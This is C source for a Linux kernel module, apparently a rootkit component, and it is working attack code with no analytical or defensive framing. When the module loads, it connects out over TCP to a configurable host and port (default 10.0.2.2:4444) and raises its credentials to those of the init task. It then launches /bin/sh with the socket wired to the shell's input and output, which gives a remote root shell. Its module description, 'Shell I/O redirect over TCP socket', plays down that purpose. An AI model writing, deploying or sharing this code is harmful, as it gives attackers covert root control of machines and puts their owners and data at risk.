// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/umh.h>
#include <linux/cred.h>
#include <linux/sched/task.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/mutex.h>
#include <net/sock.h>

static char *host = "10.0.2.2";
module_param(host, charp, 0400);

static int port = 4444;
module_param(port, int, 0400);

static struct file *rk_sock_file;
static DEFINE_MUTEX(rk_shell_lock);
static bool rk_shell_busy;

// Install the socket as stdin, stdout, stderr and escalate to root
static int rk_umh_init(struct subprocess_info *info, struct cred *new)
{
	int fd;
	int i;

	commit_creds(prepare_kernel_cred(&init_task));

	for (i = 0; i < 3; i++) {
		fd = get_unused_fd_flags(0);
		if (fd < 0)
			return fd;
		fd_install(fd, get_file(rk_sock_file));
	}

	return 0;
}

static int __init rk_init(void)
{
	struct socket *sock;
	struct sockaddr_in addr;
	struct subprocess_info *info;
	int error;

	char *argv[] = { "/bin/sh", NULL };
	char *envp[] = {
		"HOME=/",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
		NULL
	};

	mutex_lock(&rk_shell_lock);
	if (rk_shell_busy) {
		mutex_unlock(&rk_shell_lock);
		return -EBUSY;
	}
	rk_shell_busy = true;
	mutex_unlock(&rk_shell_lock);

	error = sock_create_kern(current->nsproxy->net_ns,
				 AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
	if (error)
		goto out_clear;

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = in_aton(host);
	addr.sin_port = htons(port);

	error = kernel_connect(sock, (struct sockaddr_unsized *)&addr,
			       sizeof(addr), 0);
	if (error)
		goto out_sock;

	rk_sock_file = sock_alloc_file(sock, 0, NULL);
	if (IS_ERR(rk_sock_file)) {
		error = PTR_ERR(rk_sock_file);
		rk_sock_file = NULL;
		goto out_sock;
	}

	info = call_usermodehelper_setup(argv[0], argv, envp,
					 GFP_KERNEL,
					 rk_umh_init, NULL, NULL);
	if (!info) {
		error = -ENOMEM;
		goto out_file;
	}

	error = call_usermodehelper_exec(info, UMH_WAIT_EXEC);
	if (error)
		goto out_file;

	return 0;

out_file:
	fput(rk_sock_file);
	rk_sock_file = NULL;
	goto out_clear;

out_sock:
	sock_release(sock);

out_clear:
	mutex_lock(&rk_shell_lock);
	rk_shell_busy = false;
	mutex_unlock(&rk_shell_lock);
	return error;
}

static void __exit rk_exit(void)
{
	if (rk_sock_file)
		fput(rk_sock_file);

	mutex_lock(&rk_shell_lock);
	rk_shell_busy = false;
	mutex_unlock(&rk_shell_lock);
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Shell I/O redirect over TCP socket");
